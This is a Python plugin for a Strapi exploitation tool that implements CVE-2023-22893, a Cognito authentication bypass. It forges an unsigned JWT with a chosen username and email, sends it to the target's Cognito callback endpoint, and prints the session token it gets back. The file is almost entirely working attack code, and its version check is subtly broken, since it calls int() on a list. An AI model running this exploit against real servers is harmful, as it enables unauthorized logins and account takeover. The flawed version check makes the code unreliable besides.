'''CVE-2023-22893 exploit for Strapi. '''
from json import JSONDecodeError
import requests
from strapi_plugin import StrapiExploitInterface
import jwt
import re

class CVE_2023_22893(StrapiExploitInterface):
    '''CVE-2023-22893 exploit for Strapi.'''

    def __init__(self):
        super().__init__("CVE-2023-22893", "Authentication bypass for AWS Cognito")
        self.url = None
    def check_if_vulnerable(self, version: str) -> bool:
        '''Check if the Strapi instance is vulnerable.'''
        version = re.findall(r'\d+', version)
        if int(version) > 3.2 and int(version) < 4.6:
            return True
        return False
    def exploit(self, username: str, email: str) -> bool:
        '''Exploit the vulnerability.'''

        payload = {
          "cognito:username": username,
          "email": email
        }

        jwt_token = jwt.encode(payload, None, algorithm=None)
        
        try:
            r = requests.get(f"{self.url}/api/auth/cognito/callback?access_token=something&id_token={jwt_token}", timeout=10).json()

            if "jwt" not in r:
                return False

            self.success(f"JWT: {r['jwt']}\nUsername: {r['user']['username']}\nEmail: {r['user']['email']}")
            return True
        except JSONDecodeError:
            return False

    def run(self) -> bool:
        self.url = self.input("Enter the URL of the Strapi instance")
        if self.url.endswith("/"):
            self.url = self.url[:-1]
        version = self.get_strapi_version(self.url)
        if not self.check_if_vulnerable(version):
            self.error("The Strapi instance is not vulnerable.")
            return True
        username = self.input("Username : ")
        email = self.input("Email : ")
        self.exploit(username, email)

def init():
    '''Initialize the plugin.'''
    return CVE_2023_22893()